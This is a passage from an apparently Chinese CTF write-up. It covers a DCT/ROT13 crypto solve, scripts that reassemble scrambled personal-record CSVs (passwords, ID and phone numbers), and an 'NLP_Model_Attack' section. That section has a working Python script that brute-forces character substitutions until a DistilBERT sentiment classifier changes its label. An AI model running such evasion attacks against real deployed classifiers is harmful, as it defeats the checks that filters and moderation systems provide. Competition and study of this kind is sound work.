class="hljs-number">34.9307</span>, -<span class="hljs-number">35.735</span>,-<span class="hljs-number">20.0848</span>, <span class="hljs-number">39.689</span>, <span class="hljs-number">21.879</span>, <span class="hljs-number">26.8296</span>]<br><span class="hljs-comment">#离散余弦变化逆变换 </span><br>C = idct(A, norm=<span class="hljs-string">&#x27;ortho&#x27;</span>)<br><span class="hljs-built_in">print</span>(C)<br><span class="hljs-comment">#chr输出 四舍五入</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(C)):<br>    C[i] = <span class="hljs-built_in">round</span>(C[i])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> C])) <br><br><br>然后再rot13解密<br></code></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/08/27/1pXI5eNOK8DduF6.png" srcset="/img/loading.gif" lazyload alt="image-20240827191957560"></p>
<h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h3 id="NLP-Model-Attack"><a href="#NLP-Model-Attack" class="headerlink" title="NLP_Model_Attack"></a>NLP_Model_Attack</h3><p>AI 攻击， 暴力美学</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations, product<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> DistilBertTokenizer, DistilBertForSequenceClassification<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_similarity</span>(<span class="hljs-params">original, modified, model, tokenizer</span>):<br>    <span class="hljs-comment"># 确保模型处于评估模式</span><br>    model.<span class="hljs-built_in">eval</span>()<br><br>    <span class="hljs-comment"># 对原始文本和修改后的文本进行编码</span><br>    original_encoding = tokenizer(original, return_tensors=<span class="hljs-string">&#x27;pt&#x27;</span>, padding=<span class="hljs-literal">True</span>, truncation=<span class="hljs-literal">True</span>, max_length=<span class="hljs-number">512</span>)<br>    modified_encoding = tokenizer(modified, return_tensors=<span class="hljs-string">&#x27;pt&#x27;</span>, padding=<span class="hljs-literal">True</span>, truncation=<span class="hljs-literal">True</span>, max_length=<span class="hljs-number">512</span>)<br><br>    <span class="hljs-comment"># 将输入数据移动到 GPU</span><br>    original_encoding = &#123;key: value.to(model.device) <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> original_encoding.items()&#125;<br>    modified_encoding = &#123;key: value.to(model.device) <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> modified_encoding.items()&#125;<br><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-comment"># 获取原始文本的输出，确保返回 hidden_states</span><br>        original_outputs = model(**original_encoding, output_hidden_states=<span class="hljs-literal">True</span>)<br>        original_hidden_state = original_outputs.hidden_states[-<span class="hljs-number">1</span>].mean(dim=<span class="hljs-number">1</span>)  <span class="hljs-comment"># 取最后一层的均值</span><br><br>        <span class="hljs-comment"># 获取修改后文本的输出，确保返回 hidden_states</span><br>        modified_outputs = model(**modified_encoding, output_hidden_states=<span class="hljs-literal">True</span>)<br>        modified_hidden_state = modified_outputs.hidden_states[-<span class="hljs-number">1</span>].mean(dim=<span class="hljs-number">1</span>)  <span class="hljs-comment"># 取最后一层的均值</span><br><br>    <span class="hljs-comment"># 计算余弦相似度</span><br>    similarity = torch.cosine_similarity(original_hidden_state, modified_hidden_state)<br><br>    <span class="hljs-keyword">return</span> similarity.item()  <span class="hljs-comment"># 转换为标量</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">classify_text</span>(<span class="hljs-params">text, model, tokenizer</span>):<br>    <span class="hljs-comment"># 将模型设置为评估模式</span><br>    model.<span class="hljs-built_in">eval</span>()<br><br>    <span class="hljs-comment"># 对输入文本进行编码</span><br>    encoding = tokenizer(text, return_tensors=<span class="hljs-string">&#x27;pt&#x27;</span>, padding=<span class="hljs-literal">True</span>, truncation=<span class="hljs-literal">True</span>, max_length=<span class="hljs-number">512</span>)<br><br>    <span class="hljs-comment"># 将编码移动到 GPU（如果可用）</span><br>    encoding = &#123;key: value.to(model.device) <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> encoding.items()&#125;<br><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-comment"># 获取模型的输出，确保返回 hidden_states</span><br>        outputs = model(**encoding, output_hidden_states=<span class="hljs-literal">True</span>)<br>        logits = outputs.logits  <span class="hljs-comment"># 获取 logits</span><br><br>    <span class="hljs-comment"># 计算预测的类别</span><br>    predicted_class = torch.argmax(logits, dim=<span class="hljs-number">1</span>).item()<br><br>    <span class="hljs-keyword">return</span> predicted_class<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotate_char_at_position</span>(<span class="hljs-params">text, i, rotate_count=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-comment"># 确保位置有效</span><br>    <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> i &gt;= <span class="hljs-built_in">len</span>(text):<br>        <span class="hljs-keyword">return</span> text  <span class="hljs-comment"># 如果位置无效，直接返回原字符串</span><br><br>    <span class="hljs-comment"># 将字符串转换为列表</span><br>    temp_str = <span class="hljs-built_in">list</span>(text)<br>    <span class="hljs-comment"># 根据新的规则替换字符</span><br>    temp_str[i] = rotate_char(temp_str[i], rotate_count)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(temp_str)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotate_char</span>(<span class="hljs-params">c, rotate_count</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rotate_count):<br>        <span class="hljs-keyword">if</span> c == <span class="hljs-string">&#x27;z&#x27;</span>:<br>            c = <span class="hljs-string">&#x27;A&#x27;</span><br>        <span class="hljs-keyword">elif</span> c == <span class="hljs-string">&#x27;Z&#x27;</span>:<br>            c = <span class="hljs-string">&#x27;1&#x27;</span><br>        <span class="hljs-keyword">elif</span> c == <span class="hljs-string">&#x27;9&#x27;</span>:<br>            c = <span class="hljs-string">&#x27;-&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            c = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(c) + <span class="hljs-number">1</span>)  <span class="hljs-comment"># 获取下一个字符</span><br>    <span class="hljs-keyword">return</span> c<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_combinations</span>(<span class="hljs-params">s, positions, num_chars</span>):<br>    <span class="hljs-comment"># 确保位置有效</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(pos &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> pos &gt;= <span class="hljs-built_in">len</span>(s) <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> positions):<br>        <span class="hljs-keyword">return</span> s  <span class="hljs-comment"># 如果有无效位置，直接返回原字符串</span><br><br>    <span class="hljs-comment"># 生成字符集</span><br>    char_set = [<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>), <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;z&#x27;</span>) + <span class="hljs-number">1</span>)] + \<br>               [<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>), <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;Z&#x27;</span>) + <span class="hljs-number">1</span>)]<br><br>    <span class="hljs-comment"># 生成所有可能的字符组合</span><br>    <span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> product(char_set, repeat=num_chars):<br>        <span class="hljs-comment"># 将字符组合转换为列表</span><br>        temp_str = <span class="hljs-built_in">list</span>(s)<br>        <br>        <span class="hljs-comment"># 替换指定位置的字符</span><br>        <span class="hljs-keyword">for</span> idx, pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(positions):<br>            <span class="hljs-keyword">if</span> idx &lt; <span class="hljs-built_in">len</span>(combo):  <span class="hljs-comment"># 确保组合的长度不超出位置数组</span><br>                temp_str[pos] = combo[idx]<br><br>        <span class="hljs-comment"># 输出每种组合的结果</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&#x27;&#x27;</span>.join(temp_str))<br><br><br><span class="hljs-comment"># 定义模型和分词器的路径</span><br>model_path = <span class="hljs-string">&quot;Sentiment_classification_model&quot;</span><br><br><span class="hljs-comment"># 加载分词器</span><br>tokenizer = DistilBertTokenizer.from_pretrained(model_path)<br><br><span class="hljs-comment"># 加载模型并移动到 GPU（如果可用）</span><br>device = torch.device(<span class="hljs-string">&#x27;cuda&#x27;</span> <span class="hljs-keyword">if</span> torch.cuda.is_available() <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;cpu&#x27;</span>)<br>model = DistilBertForSequenceClassification.from_pretrained(model_path).to(device)  <span class="hljs-comment"># 使用 ForSequenceClassification</span><br><br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br><span class="hljs-comment"># 读取数据</span><br>data = pd.read_csv(<span class="hljs-string">&#x27;original_text.csv&#x27;</span>)<br>attack = pd.read_csv(<span class="hljs-string">&#x27;attack.csv&#x27;</span>)<br>success = <span class="hljs-number">0</span><br>succeededRows = []<br><br><br><span class="hljs-keyword">for</span> index, row <span class="hljs-keyword">in</span> data.iterrows():<br>    attackRow = attack.iloc[index]<br>    <span class="hljs-built_in">id</span> = <span class="hljs-built_in">str</span>(row[<span class="hljs-string">&#x27;id&#x27;</span>])<br>    <br>    text = row[<span class="hljs-string">&#x27;text&#x27;</span>]<br>    label = row[<span class="hljs-string">&#x27;original_label&#x27;</span>]<br><br>    attackText = attackRow[<span class="hljs-string">&#x27;text&#x27;</span>]<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">300</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    curPos = i<br>    <span class="hljs-comment"># 遍历数据</span><br>    <span class="hljs-keyword">for</span> index, row <span class="hljs-keyword">in</span> data.iterrows():<br>        <span class="hljs-keyword">if</span> index <span class="hljs-keyword">in</span> succeededRows:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-comment"># get attack text</span><br>        attackRow = attack.iloc[index]<br>        <span class="hljs-comment"># 获取原始文本和修改后的文本</span><br>        <span class="hljs-built_in">id</span> = row[<span class="hljs-string">&#x27;id&#x27;</span>]<br>        text = row[<span class="hljs-string">&#x27;text&#x27;</span>]<br>        label = row[<span class="hljs-string">&#x27;original_label&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(text) &lt; curPos:<br>            <span class="hljs-keyword">continue</span><br>        attackText = text<br>        <span class="hljs-comment"># check attack id start with &#x27;*&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(attackRow[<span class="hljs-string">&#x27;id&#x27;</span>])[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;*&#x27;</span>:<br>            <span class="hljs-keyword">continue</span><br><br>        <br>        <span class="hljs-comment"># 计算相似度</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span>:<br><br>            <span class="hljs-comment"># remove the character at position i</span><br>            tmpAtt = attackText[:curPos] + attackText[curPos + <span class="hljs-number">1</span>:]<br>            similarity = verify_similarity(text, attackText, model, tokenizer)<br>            <span class="hljs-keyword">if</span> similarity &gt; <span class="hljs-number">0.75</span>:<br>                new_label = classify_text(attackText, model, tokenizer)<br>                <span class="hljs-keyword">if</span> label != new_label:<br>                    <span class="hljs-comment"># print(f&quot;[+] S: &#123;similarity&#125; OC:&#123;label&#125; C: &#123;new_label&#125; ID: &#123;id&#125; edited: &#123;attackText&#125;&quot;)</span><br>                    success += <span class="hljs-number">1</span><br>                    succeededRows.append(index)<br>                    <span class="hljs-keyword">continue</span><br>                    <br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">63</span>):<br>                attackText = attackText[:curPos] + <span class="hljs-string">&#x27;A&#x27;</span> + attackText[curPos + <span class="hljs-number">1</span>:]<br>                attackText = generate_combinations(attackText, [curPos], <span class="hljs-number">1</span>)<br>                attackText = rotate_char_at_position(attackText, curPos, i)<br>                similarity = verify_similarity(text, attackText, model, tokenizer)<br>                <span class="hljs-keyword">if</span> similarity &lt; <span class="hljs-number">0.75</span>:<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-comment">#print(f&quot;[?] S: &#123;similarity&#125; OC:&#123;label&#125; C: &#123;new_label&#125; ID: &#123;id&#125; edited: &#123;attackText&#125;&quot;)</span><br>                <span class="hljs-comment"># 获取预测的类别</span><br>                new_label = classify_text(attackText, model, tokenizer)<br>                <span class="hljs-comment"># 打印相似度</span><br><br>                <span class="hljs-keyword">if</span> label != new_label <span class="hljs-keyword">and</span> similarity &gt; <span class="hljs-number">0.75</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] S: <span class="hljs-subst">&#123;similarity&#125;</span> OC:<span class="hljs-subst">&#123;label&#125;</span> C: <span class="hljs-subst">&#123;new_label&#125;</span> ID: <span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span> edited: <span class="hljs-subst">&#123;attackText&#125;</span>&quot;</span>)<br>                        <span class="hljs-comment"># 修改 attack.csv</span><br>                        attack.at[index, <span class="hljs-string">&#x27;text&#x27;</span>] = attackText<br>                        <span class="hljs-comment"># 对 id 前缀 *</span><br>                        attack.at[index, <span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-string">&#x27;*&#x27;</span> + <span class="hljs-built_in">str</span>(attackRow[<span class="hljs-string">&#x27;id&#x27;</span>])<br>                        <span class="hljs-comment"># 保存修改后的数据</span><br>                        attack.to_csv(<span class="hljs-string">&#x27;attack.csv&#x27;</span>, index=<span class="hljs-literal">False</span>)<br>                        success += <span class="hljs-number">1</span><br>                        succeededRows.append(index)<br>                        <span class="hljs-keyword">break</span><br>        <br>    <span class="hljs-built_in">print</span>(success)<br>        <span class="hljs-comment">#print(f&quot;S: &#123;similarity&#125; OC:&#123;label&#125; C: &#123;new_label&#125;&quot;)</span><br><br></code></pre></td></tr></table></figure>

<p>直接逐位爆破， 然后判断， 一位不行两位， 能够爆破出来正确的</p>
<h2 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h2><h3 id="data-analy1"><a href="#data-analy1" class="headerlink" title="data-analy1"></a>data-analy1</h3><p>就是一个简单的还原EXCEL表</p>
<p>EXP：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> csv<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">juage</span>(<span class="hljs-params"><span class="hljs-built_in">list</span></span>):<br>    result_List=[<span class="hljs-number">0</span>]*<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>        <span class="hljs-keyword">if</span> (<span class="hljs-number">0x4e00</span> &lt;= <span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) &lt;= <span class="hljs-number">0x9fff</span>) <span class="hljs-keyword">and</span> (<span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) != <span class="hljs-number">30007</span>) <span class="hljs-keyword">and</span> (<span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) != <span class="hljs-number">22899</span>) <span class="hljs-keyword">and</span> (<span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) != <span class="hljs-number">22899</span>):<br>            result_List[<span class="hljs-number">3</span>]=i<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(i)&lt;=<span class="hljs-number">5</span>:<br>            <span class="hljs-keyword">try</span>:<br>                result_List[<span class="hljs-number">0</span>]=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(i))<br>            <span class="hljs-keyword">except</span> ValueError:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) == <span class="hljs-number">30007</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) == <span class="hljs-number">22899</span>:<br>                    result_List[<span class="hljs-number">4</span>]=i<br>                <span class="hljs-keyword">else</span>:<br>                    result_List[<span class="hljs-number">1</span>] = i<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(i)==<span class="hljs-number">32</span>:<br>            result_List[<span class="hljs-number">2</span>]=i<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(i)==<span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">try</span>:<br>                result_List[<span class="hljs-number">5</span>] = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(i))<br>            <span class="hljs-keyword">except</span> ValueError:<br>                result_List[<span class="hljs-number">1</span>] = i<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(i)==<span class="hljs-number">18</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>                result_List[<span class="hljs-number">6</span>] = i<br>            <span class="hljs-keyword">except</span> ValueError:<br>                result_List[<span class="hljs-number">1</span>] = i<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(i)==<span class="hljs-number">11</span>:<br>            <span class="hljs-keyword">try</span>:<br>                result_List[<span class="hljs-number">7</span>] = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(i))<br>            <span class="hljs-keyword">except</span> ValueError:<br>                result_List[<span class="hljs-number">1</span>] = i<br>        <span class="hljs-keyword">elif</span> (<span class="hljs-number">0x4e00</span> &lt;= <span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) &lt;= <span class="hljs-number">0x9fff</span>) <span class="hljs-keyword">and</span> (<span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) != <span class="hljs-number">30007</span>) <span class="hljs-keyword">and</span> (<span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) != <span class="hljs-number">30008</span>) <span class="hljs-keyword">and</span> (<span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) != <span class="hljs-number">22899</span>):<br>            result_List[<span class="hljs-number">3</span>]=i<br>        <span class="hljs-keyword">else</span>:<br>            result_List[<span class="hljs-number">1</span>]=i<br>    <span class="hljs-keyword">return</span> result_List<br><br>result=[]<br><span class="hljs-comment"># 打开文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;person_data.csv&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> csvfile:<br>    <span class="hljs-comment"># 创建csv.reader对象</span><br>    reader = csv.reader(csvfile)<br><br>    <span class="hljs-comment"># 跳过第一行</span><br>    <span class="hljs-built_in">next</span>(reader)<br>    <span class="hljs-comment"># 逐行读取剩余的数据</span><br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:<br>        <span class="hljs-comment"># 处理每一行数据</span><br>        row=juage(row)<br>        result.append(row)<br>        <span class="hljs-built_in">print</span>(row)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;result.csv&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>, newline=<span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-comment"># 2. 基于文件对象构建 csv写入对象</span><br>    csv_writer = csv.writer(f)<br>    <span class="hljs-comment"># 3. 构建列表头</span><br>    name=[<span class="hljs-string">&#x27;编号&#x27;</span>,<span class="hljs-string">&#x27;用户名&#x27;</span>,<span class="hljs-string">&#x27;密码&#x27;</span>,<span class="hljs-string">&#x27;姓名&#x27;</span>,<span class="hljs-string">&#x27;性别&#x27;</span>,<span class="hljs-string">&#x27;出生日期&#x27;</span>,<span class="hljs-string">&#x27;身份证号&#x27;</span>,<span class="hljs-string">&#x27;手机号码&#x27;</span>]<br>    csv_writer.writerow(name)<br>    <span class="hljs-comment"># 4. 写入csv文件内容</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> result:<br>        csv_writer.writerow(i)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;写入数据成功&quot;</span>)<br>    <span class="hljs-comment"># 5. 关闭文件</span><br>    f.close()<br></code></pre></td></tr></table></figure>



<h3 id="data-analy2"><a href="#data-analy2" class="headerlink" title="data-analy2"></a>data-analy2</h3><p>使用tshark将http流量导出</p>
<p><img src="https://s2.loli.net/2024/08/27/CwYbMiakfTmhRXA.png" srcset="/img/loading.gif" lazyload alt="8e0155609279c06818ca3b6b0ac52ce7"></p>
<p>EXP：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> csv<br><br><br><span class="hljs-comment"># Define datasets at the start</span><br>wgt = [<span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br>chk = <span class="hljs-string">&#x27;10X98765432&#x27;</span><br>prf = &#123;<span class="hljs-number">734</span>, <span class="hljs-number">735</span>, <span class="hljs-number">736</span>, <span class="hljs-number">737</span>, <span class="hljs-number">738</span>, <span class="hljs-number">739</span>, <span class="hljs-number">747</span>, <span class="hljs-number">748</span>, <span class="hljs-number">750</span>, <span class="hljs-number">751</span>, <span class="hljs-number">752</span>, <span class="hljs-number">757</span>, <span class="hljs-number">758</span>, <span class="hljs-number">759</span>, 